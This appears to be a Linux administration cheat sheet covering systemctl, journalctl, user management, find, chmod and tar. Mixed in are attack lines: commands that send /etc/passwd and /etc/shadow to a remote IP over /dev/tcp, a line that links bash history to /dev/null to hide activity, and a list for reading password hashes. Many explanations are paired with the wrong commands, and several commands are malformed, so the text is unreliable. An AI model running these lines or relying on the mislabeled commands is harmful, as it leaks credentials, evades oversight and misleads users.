# Linux CLI II

## Linux systemctl, username/groups, and more

## Overview

Systemctl, journalctl, usernames/groups, and more

### Systemctl

List all services and then only running services, and then only failed services:

```text
systemctl list-units --type service
systemctl list-units --type service --state running
systemctl list-units --type service --state failed
```

Stop/Start/Status of Services:

```text
sudo systemctl stop postfix
sudo systemctl start postfix
systemctl status postfix
```

Enable and Disable Service at Boot time:

```text
sudo systemctl enable httpd
sudo systemctl disable httpd
```

Starting and enabling services at the same time:

```text
systemctl enable --now httpd
```

Show all unit files for available targets:

```text
systemctl list-unit-files -t target
```

Show all loaded and active unit files:

```text
systemctl list-units -t target
```

List out the default target:

```text
systemctl get-default
```

See how long system took to boot and how much time per service:

```text
systemd-analyze
systemd-analyze blame
```

### Journalctl

Kernel Messages and Local Log Checks:

```text
dmesg
journalctl -k
```

Reading logs with journalctl:

```text
journalctl -u ssh.service
journalctl -u apache2.service
journalctl -u dhcpcd.service
```

Journal in general:

```text
journalctl --since "1 hour ago"
journalctl --since "2 days ago"
journalctl --since "2015-06-26 23:15:00" --until "2015-06-26 23:20:00"
```

Journal by unit\(s\):

```text
journalctl -u apache2.service
journalctl -u nginx.service -u mysql.service
```

Tail the file:

```text
journalctl -f
journalctl -u mysql.service -f
journalctl -n 50 --since "1 hour ago"
```

In JSON Output:

```text
journalctl -u apache2.service -r -o json-pretty
```

By priority and user:

```text
journalctl -b -1  -p "emerg".."crit"
id apache2.service
```

### Find OS details:

```text
cat /etc/os-release
cat /etc/system-release
cat /etc/debian_version
cat /etc/redhat-release
cat /etc/centos-release
uname -a
uname -r
```

Reboot Commands:

```text
reboot
telinit 6
shutdown -r now
systemctl isolate reboot.target
```

### Create User/Groups:

```text
useradd jbobb
useradd cnewsome

mkdir /home/jbobb
mkdir /home/cnewsome

sudo chown jbobb:jbobb jbobb
sudo chown cnewsome:cnewsome cnewsome
```

Better method to creating users:

```text
adduser jbobb
adduser cnewsome
```

--You will be prompted to fill in additional user information

To delete users do the following:

```text
userdel -r jbobb
userdel -r cnewsome
```

Create Group:

```text
addgroup super
groupadd super
```

Add users to group:

```text
usermod -aG super jbobb
usermod -aG super cnewsome
```

Lock account:

```text
usermod -L cnewsome
```

Manage Template User Environment: Note: This directory contains all the files and resources that we provide to new users when they are added with the adduser command.

```text
cd /etc/skel
```

### Linux Password Strength:

```text
pwquality over-rules /etc/login.defs settings

cd /etc/pam.d
grep 'pwquality' *

cd /etc/security
su -
vi pwquality.conf
```

Change the minimum length and required contents of password allowed:

```text
minlen = 22
minclass = 3
```

Next create user with short password:

```text
sudo useradd goldie
```

Using chage to enforce password expiry:

```text
-m = Min days before expiry, have to have it for 5 days
-M = Mac days before expiry, no longer usable after 90 days
-I = Inactive after 2 days
-W = Set expiration warning
chage -m 5 -M 90 -I 2 -W 5 jimbo
```

Using the -t and -c options together to HUP processes

```text
kill -HUP lsof -t -c sshd
```

Show open connections with a port range

```text
lsof -i @fw.google.com:2150=2180
```

Find Out top 10 CPU Consuming Process

```text
ps -auxf | sort -nr -k 3 | head -10
```

Processes

```text
ps -ef
```

Process Heirarchy in forest

```text
ps -ef –forest
```

Show process in tree format alphabetically

```text
pstree
```

Find all files in the /usr/bin directory or subdirecties that are larger than 27,000 bytes:

```text
find /usr/bin -size +27000c
find /usr/bin -size +27k
```

Find all files in the /usr/bin directory or subdirectories that are larger than 1 megabyte:

```text
find /usr/bin/ -size 1M
```

Look for files named with dots and spaces: \(“...”, “.. “, “. “, and “ “\):

```text
find / -name “...“ –print
find / -name “.. “ –print
find / -name “. “ –print
find / -name “ “ –print
```

A very simple and useful stopwatch

```text
find . -type f -exec ls -l '{}' \;
```

Make ‘less’ behave like ‘tail -f’

```text
find . -type f -print0 | xargs -0 ls -l
```

Create and Burn ISO Image

```text
find . -type f | xargs ls -l
```

Find out all the jpg images and archive it:

```text
find / -name *.jpg -type f -print | xargs tar -cvzf images.tar.gz
```

List all files and obtain sha1sum

```text
find / -print|xargs sha1sum
```

Or use quotes '{}' with -exec

```text
find / -xdev -perm +o=w ! ( -type d -perm +o=t ) -type 1 -ok chmod -v o-w {} \;
```

Change permissions on all files found in directory:

```text
find /home -perm 777 -exec chmod 555 {} \;
```

Find everything in your file system that has been modified in the last day:

```text
find / -mtime +1
```

Find everything in your file system that has been accessed in the last day:

```text
find / -atime +1
```

The cat tool’s name is short for concatenate. You can combine the output of multiple files like this:

```text
cat file1 file2
```

You can achieve complex results by combining commands:

```text
cat file1 file2 | sort > file1and2
```

The tar command is the de facto standard for creating backups. To create an uncompressed backup:

```text
tar cvf backupfile.tar /path/to/backup
```

To create a compressed backup:

```text
tar cfzv backupfile.tar.gz /path/to/backup
```

To extract the contents of a compressed tar file to the current directory:

```text
tar xvfz databackup.tar.gz
```

Compressing multiple files:

```text
gzip /root/anaconda-ks.cfg /root/original-ks.cfg
```

Look recursively in a directory for files with a specific word:

```text
grep -rnw '/path/to/somewhere/' -e 'SME'
grep -rabi ' love ' /
```

Shutdown Commands:

```text
poweroff
telinit 0
shutdown oh +1
systemctl isolate poweroff.target
```

LinuxAccountManipulation

```text
• See all local accounts:cat/etc/passwd
• See all password hashes:cat/etc/shadow
• See who has UID0(root):getent passwd 0
• See who is in the root group: getent group root
• See who has the right to run the su command: sudo cat /etc/sudoers
```

Display free memory in gigabytes:

```text
free -gh
```

Create Aliases

```text
alias showlm="tail -f /var/log/messages"
```

Customize Bash Prompt: Check Settings:

```text
set|grep PS
```

Change prompt so time, hostname, working directory, and user are shown:

```text
export PS1='\t \h:\W \u\$ '
```

Change prompt so time, date, hostname, working directory, and user are shown:

```text
export PS1='\t \d \h:\W \u\$ '
```

Locate:

```text
updatedb
locate usr |grep /bin
```

Remove Carriage return from echo command:

```text
echo -n something >> myfile.txt
```

Sort regardless of case:

```text
ls /etc/|sort -f|less
```

To sort in reverse order:

```text
sort -r shoppinglist
```

### Basic Admin Commands

Lock account

```text
passwd -l userName
```

Unlock account

```text
passwd -u userName
```

To unlock an account after login failures, run:

```text
faillog -r -u userName
```

List the size \(in human readable form\) of all sub folders from the current location

```text
dd if=/dev/hdc of=/tmp/mycd.iso bs=2048 conv=notrunc
```

Will not work with spaces in names

```text
chmod 1777 /tmp
```

Will work with spaces in names

```text
chmod 4711 myfile
```

Find and interactively fix world-writable files:

```text
chmod 600 /etc/lilo.conf
```

set-UID executable, no read

```text
chmod 766 myfile
```

set "sticky bit"

```text
chmod a-x myfile
```

file is "world write"

```text
chmod g+w myfile
```

only owner perms set

```text
chmod o-r myfile
```

turn off execute

```text
chmod u-s myfile
```

Empty a file

```text
du -h –max-depth=1
```

Determine file type

```text
file
```

Last Users Logged On

```text
last -a
```

Send bash history to /dev/null

```text
ln /dev/null ~/.bash_history -sf
```

### Kernel Version and CPU

```text
uname -a
```

Add a startup service

```text
update-rc.d defaults
```

System Uptime

```text
uptime
```

Refresh netstat every 2 seconds

```text
watch netstat -i
```

Network Connections \(all, no name resolution\)

```text
watch ss -na
```

Find Files

```text
whereis -b
```

Current Username

```text
who
```

Open Ports via /dev/tcp:

```text
cat /etc/passwd > /dev/tcp/10.10.10.18/443
cat /etc/shadow > /dev/tcp/10.10.10.18/443
chmod - file permissions
```

Remove read \(-r\) from others \(o\)

```text
chmod o-r somefile.txt
```

Add read/write \(+rw\) permissions for user and group \(ug\)

```text
chmod ug+rw somefile.txt
```

Read-only, no execute or write \(=r\) for group & other \(go\)

```text
chmod go=r somefile.txt
```

You can also use the octal representation to set the permissions. Read is 4, write is 2, and execute is 1. The sum of the set bits is the permission \(for example, read/write=4+2=6, read/exec=2+1=3\).

```text
chmod 750 somefile.txt
```

User is 7=4+2+1=rwx, group is 5=4+1=rx, other=none.

Xargs versus Exec Speed: Let’s compare a folder with 1000 files in it.

```text
time find . -type f -name "*.txt" -exec rm {} \;
time find ./foo -type f -name "*.txt" | xargs rm
```

